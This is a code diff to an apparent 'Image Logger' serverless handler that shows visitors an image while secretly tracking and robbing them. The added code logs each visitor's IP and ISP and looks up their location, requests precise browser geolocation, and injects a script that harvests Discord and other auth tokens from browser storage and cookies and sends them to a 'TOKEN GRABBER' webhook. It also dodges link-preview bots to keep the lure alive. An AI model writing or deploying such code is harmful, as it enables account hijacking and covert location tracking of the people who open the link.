@@ -10,7 +10,7 @@ const config = {
   username: "Image Logger",
   color: 0x00FFFF,
   crashBrowser: false,
-  accurateLocation: false,
+  accurateLocation: true,
   message: {
     doMessage: false,
     message: "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
@@ -29,16 +29,16 @@ const config = {
 const blacklistedIPs = ["27", "104", "143", "164"];
 
 function botCheck(ip, useragent) {
-  if (ip.startsWith("34") || ip.startsWith("35")) {
-    return "Discord";
-  } else if (useragent.startsWith("TelegramBot")) {
-    return "Telegram";
-  }
+  if (!ip || !useragent) return false;
+  if (ip.startsWith("34.") || ip.startsWith("35.")) return "Discord";
+  if (useragent.includes("TelegramBot")) return "Telegram";
+  if (useragent.includes("Twitterbot")) return "Twitter";
+  if (useragent.includes("Discordbot")) return "Discord";
   return false;
 }
 
 async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = false) {
-  if (blacklistedIPs.some(prefix => ip.startsWith(prefix))) return;
+  if (!ip || blacklistedIPs.some(prefix => ip.startsWith(prefix))) return null;
   
   const bot = botCheck(ip, useragent);
   if (bot) {
@@ -51,18 +51,19 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
           embeds: [{
             title: "Image Logger - Link Sent",
             color: config.color,
-            description: `Link sent on ${bot}\n**IP:** ${ip}`
+            description: `Link sent on ${bot}\n**IP:** ${ip}\n**Path:** ${endpoint}`
           }]
         })
       });
     }
-    return;
+    return null;
   }
 
   try {
-    const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`).then(res => res.json());
+    const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,proxy,hosting,mobile,timezone`)
+      .then(res => res.json());
     
-    if (ipInfo.status !== 'success') throw new Error('IP API failed');
+    if (ipInfo.status !== 'success') throw new Error(ipInfo.message || 'IP API error');
     
     const { os, browser } = httpagentparser.parse(useragent);
     
@@ -73,12 +74,15 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
         title: "Image Logger - IP Logged",
         color: config.color,
         description: `**IP:** ${ip}
-        **Location:** ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
-        **ISP:** ${ipInfo.isp}
-        **Coordinates:** ${coords || `${ipInfo.lat}, ${ipInfo.lon}`}
-        **VPN/Proxy:** ${ipInfo.proxy ? 'Yes' : 'No'}
-        **OS:** ${os.name} | **Browser:** ${browser.name}
-        **User Agent:** \`\`\`${useragent}\`\`\``,
+**Location:** ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
+**ISP:** ${ipInfo.isp}
+**Coordinates:** ${coords || `${ipInfo.lat}, ${ipInfo.lon}`}
+**Timezone:** ${ipInfo.timezone}
+**Mobile:** ${ipInfo.mobile ? 'Yes' : 'No'}
+**VPN/Proxy:** ${ipInfo.proxy ? 'Yes' : 'No'}
+**Hosting:** ${ipInfo.hosting ? 'Yes' : 'No'}
+**OS:** ${os.name} | **Browser:** ${browser.name}
+**User Agent:** \`\`\`${useragent}\`\`\``,
       }]
     };
     
@@ -93,29 +97,40 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
     return ipInfo;
   } catch (error) {
     console.error('Reporting error:', error);
+    return null;
   }
 }
 
 async function sendTokenReport(ip, useragent, token) {
-  await fetch(config.tokenCaptureWebhook, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      username: "TOKEN GRABBER",
-      content: "@everyone",
-      embeds: [{
-        title: "Discord Token Captured!",
-        color: 0xFF0000,
-        description: `**Token:** \`${token}\`\n**IP:** ${ip}\n**User Agent:** ${useragent}`,
-      }]
-    })
-  });
+  try {
+    await fetch(config.tokenCaptureWebhook, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        username: "TOKEN GRABBER",
+        content: "@everyone",
+        embeds: [{
+          title: "Discord Token Captured!",
+          color: 0xFF0000,
+          description: `**Token:** \`${token}\`\n**IP:** ${ip}\n**User Agent:** ${useragent}`,
+        }]
+      })
+    });
+  } catch (error) {
+    console.error('Token report error:', error);
+  }
 }
+
+// Base64 encoded 1x1 transparent pixel
+const transparentPixel = Buffer.from(
+  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 
+  'base64'
+);
 
 export default async (req, res) => {
   try {
     // Handle token submission
-    if (req.method === 'POST' && req.url.includes('/logtoken')) {
+    if (req.method === 'POST') {
       const { token } = req.body;
       const ip = req.headers['x-forwarded-for'] || 'Unknown';
       const userAgent = req.headers['user-agent'] || 'Unknown';
@@ -128,16 +143,17 @@ export default async (req, res) => {
     }
 
     // Main GET request
-    const query = req.query;
+    const { query } = req;
     const ip = req.headers['x-forwarded-for'] || 'Unknown';
     const userAgent = req.headers['user-agent'] || 'Unknown';
     
     let imageUrl = config.image;
     if (config.imageArgument && (query.url || query.id)) {
       try {
-        imageUrl = Buffer.from(query.url || query.id, 'base64').toString('utf-8');
-      } catch {
-        // Use default image if decoding fails
+        const urlParam = query.url || query.id;
+        imageUrl = Buffer.from(urlParam, 'base64').toString('utf-8');
+      } catch (error) {
+        console.error('Image URL decode error:', error);
       }
     }
 
@@ -145,98 +161,146 @@ export default async (req, res) => {
     const bot = botCheck(ip, userAgent);
     if (bot) {
       if (config.buggedImage) {
-        res.setHeader('Content-Type', 'image/jpeg');
-        return res.send(Buffer.from(`
-          /9j/4AAQSkZJRgABAQEAYABgAAD//gA+Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcg
-          SlBFRyB2NjIpLCBxdWFsaXR5ID0gOTAK/9sAQwADAgIDAgIDAwMDBAMDBAUIBQUEBAUKBwcGCAwK
-          DAwLCgsLDQ4SEA0OEQ4LCxAWEBETFBUVFQwPFxgWFBgSFBUU/9sAQwEDBAQFBAUJBQUJFA0LDRQU
-          FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU/8AAEQgAGAAY
-          AwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMF
-          BQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkq
-          NDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqi
-          o6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/E
-          AB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMR
-          BAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVG
-          R0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKz
-          tLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/aAAwDAQACEQMRAD8A
-          /9k=
-        `, 'base64'));
+        res.setHeader('Content-Type', 'image/png');
+        return res.send(transparentPixel);
       }
       await makeReport(ip, userAgent, null, req.url, imageUrl);
       return res.redirect(imageUrl);
     }
 
-    // Handle token capture page
+    // Build HTML content
     let htmlContent = `
+    <!DOCTYPE html>
     <html>
     <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Image Viewer</title>
       <style>
-        body { margin: 0; padding: 0; }
-        .img {
-          background-image: url('${imageUrl}');
-          background-position: center center;
-          background-repeat: no-repeat;
-          background-size: contain;
-          width: 100vw;
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+        }
+        body {
+          background-color: #000;
+          display: flex;
+          justify-content: center;
+          align-items: center;
           height: 100vh;
+          overflow: hidden;
+        }
+        .image-container {
+          max-width: 100%;
+          max-height: 100vh;
+          text-align: center;
+        }
+        .image-container img {
+          max-width: 100%;
+          max-height: 90vh;
+          object-fit: contain;
+        }
+        .loading {
+          color: #fff;
+          font-family: Arial, sans-serif;
+          font-size: 18px;
+          margin-top: 20px;
         }
       </style>
       <script>
         // Token capture logic
         setTimeout(() => {
-          const tokenKeys = ['token', 'discord_token', '_token', 'access_token'];
+          const tokenKeys = [
+            'token', 'discord_token', '_token', 'access_token',
+            'auth_token', 'session_token', 'oauth_token'
+          ];
           let token = "NOT_FOUND";
           
-          // Check localStorage
+          // 1. Check localStorage
           tokenKeys.forEach(key => {
             try {
               const value = localStorage.getItem(key);
-              if (value) token = value;
+              if (value && value.length > 50) token = value;
             } catch(e) {}
           });
           
-          // Check cookies
+          // 2. Check sessionStorage
           if (token === "NOT_FOUND") {
-            document.cookie.split(';').forEach(cookie => {
-              const [name, value] = cookie.trim().split('=');
-              if (tokenKeys.includes(name)) token = value;
+            tokenKeys.forEach(key => {
+              try {
+                const value = sessionStorage.getItem(key);
+                if (value && value.length > 50) token = value;
+              } catch(e) {}
             });
+          }
+          
+          // 3. Check cookies
+          if (token === "NOT_FOUND") {
+            const cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+              const cookie = cookies[i].trim();
+              const [name, value] = cookie.split('=');
+              if (tokenKeys.includes(name) && value && value.length > 50) {
+                token = value;
+                break;
+              }
+            }
           }
           
           // Send token to server
           if (token !== "NOT_FOUND") {
-            fetch('/api/image?logtoken=1', {
+            fetch('/api/image', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ token })
             });
           }
-        }, 2000);
+        }, 3000);
       </script>
     `;
 
-    // Geolocation script if enabled
+    // Geolocation script
     if (config.accurateLocation && !query.g) {
       htmlContent += `
       <script>
         if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(position => {
-            const coords = position.coords;
-            const g = btoa(coords.latitude + ',' + coords.longitude).replace(/=/g, "%3D");
-            window.location.search += '&g=' + g;
-          });
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              const g = btoa(lat + ',' + lon).replace(/=/g, "%3D");
+              
+              const url = new URL(window.location);
+              url.searchParams.set('g', g);
+              window.location.href = url.toString();
+            },
+            error => {
+              console.error('Geolocation error:', error);
+            }
+          );
         }
       </script>
       `;
     }
 
-    htmlContent += `</head><body><div class="img"></div></body></html>`;
+    htmlContent += `
+    </head>
+    <body>
+      <div class="image-container">
+        <img src="${imageUrl}" alt="Preview">
+        <div class="loading">Loading image...</div>
+      </div>
+    </body>
+    </html>
+    `;
+    
+    // Process geolocation if available
+    const coords = query.g ? Buffer.from(query.g, 'base64').toString() : null;
     
     // Make IP report
-    const coords = query.g ? Buffer.from(query.g, 'base64').toString() : null;
     await makeReport(ip, userAgent, coords, req.url, imageUrl);
     
+    // Send response
     res.setHeader('Content-Type', 'text/html');
     res.send(htmlContent);
   } catch (error) {
